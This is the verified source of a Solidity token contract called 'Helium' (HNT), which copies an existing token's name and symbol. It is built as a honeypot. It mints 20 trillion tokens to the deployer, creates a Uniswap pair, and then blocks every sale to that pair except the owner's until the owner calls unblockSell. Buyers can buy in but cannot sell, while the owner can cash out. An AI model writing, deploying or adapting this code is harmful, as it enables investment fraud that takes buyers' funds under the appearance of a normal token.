/**
 *Submitted for verification at etherscan.io on 2026-03-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IRouter {
    function factory() external view returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Helium {

    string public name = "Helium";
    string public symbol = "HNT";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // ==== HARD-CODED (Ethereum Mainnet) ====
    address public constant ROUTER =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2
    address public constant WETH =
        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH

    address public pair;
    bool public sellBlocked = true;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;

        // ===== 20 TRILLION SUPPLY =====
        totalSupply = 20_000_000_000_000 * 10 ** decimals;
        balanceOf[owner] = totalSupply;

        pair = IFactory(IRouter(ROUTER).factory())
            .createPair(address(this), WETH);

        emit Transfer(address(0), owner, totalSupply);
    }

    // ===== TRANSFER =====
    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "Low balance");

        // Public SELL blocked (to pair)
        if (to == pair && sellBlocked) {
            require(from == owner, "Sell blocked");
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }

    // ===== APPROVALS =====
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "No allowance");
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    // ===== OWNER CONTROL =====
    function unblockSell() external onlyOwner {
        sellBlocked = false;
    }
}